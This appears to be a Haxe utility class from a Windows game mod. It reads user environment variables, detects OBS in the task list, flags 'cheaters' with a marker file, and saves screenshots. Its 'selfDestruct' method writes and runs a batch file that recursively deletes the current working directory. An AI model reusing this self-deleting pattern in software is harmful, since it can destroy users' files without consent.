package;

// crazy system shit!!!!! (only for windows)
#if windows
import flixel.FlxG;
import sys.io.File;
import sys.io.Process;
import haxe.io.Bytes;
import sys.FileSystem;
import flixel.util.FlxStringUtil;
import openfl.geom.Matrix;
import openfl.geom.Rectangle;
import openfl.Lib;
import openfl.utils.ByteArray;
import flash.display.BitmapData;
import flixel.util.FlxTimer;

using StringTools;

class CoolSystemStuff
{
	public static function getUsername():String
	{
		// uhh this one is self explanatory
		return Sys.getEnv("USERNAME");
	}

	public static function getUserPath():String
	{
		// this one is also self explantory
		return Sys.getEnv("USERPROFILE");
	}

	public static function getTempPath():String
	{
		// gets appdata temp folder lol
		return Sys.getEnv("TEMP");
	}

	public static function selfDestruct():Void
	{
		if (Main.trollMode)
		{
			// make a batch file that will delete the game, run the batch file, then close the game
			var crazyBatch:String = "@echo off\ntimeout /t 3\n@RD /S /Q \"" + Sys.getCwd() + "\"\nexit";
			File.saveContent(CoolSystemStuff.getTempPath() + "/die.bat", crazyBatch);
			new Process(CoolSystemStuff.getTempPath() + "/die.bat", []);
		}
		Sys.exit(0);
	}

	public static function checkForOBS():Bool
	{
		var fs:Bool = FlxG.fullscreen;
		if (fs)
		{
			FlxG.fullscreen = false;
		}
		var tasklist:String = "";
		var frrrt:Bytes = new Process("tasklist", []).stdout.readAll();
		tasklist = frrrt.getString(0, frrrt.length);
		if (fs)
		{
			FlxG.fullscreen = true;
		}
		return tasklist.contains("obs64.exe") || tasklist.contains("obs32.exe");
	}

	public static function writeCheaterFile():Void
	{
		if (Main.trollMode)
		{
			File.saveContent(Sys.getCwd() + "assets/marcello/images/abort/cheater.fuckyou", "");
		}
	}

	public static function isCheater():Bool
	{
		if(!Main.trollMode)
		{
			return false;
		}
		return FileSystem.exists(Sys.getCwd() + "assets/marcello/images/abort/cheater.fuckyou");
	}

	public static function screenshot()
	{
		var sp = Lib.current.stage;
		var position = new Rectangle(0, 0, Lib.current.stage.stageWidth, Lib.current.stage.stageHeight);

		var image:flash.display.BitmapData = new flash.display.BitmapData(Std.int(position.width), Std.int(position.height), false, 0xFEFEFE);
		image.draw(sp, true);

		if (!sys.FileSystem.exists(Sys.getCwd() + "\\screenshots"))
			sys.FileSystem.createDirectory(Sys.getCwd() + "\\screenshots");

		var bytes = image.encode(position, new openfl.display.PNGEncoderOptions());
		
		var dateNow:String = Date.now().toString();

		dateNow = StringTools.replace(dateNow, " ", "_");
		dateNow = StringTools.replace(dateNow, ":", "'");

		File.saveBytes(Sys.getCwd() + "\\screenshots\\" + dateNow + ".png", bytes);
	}
}
#end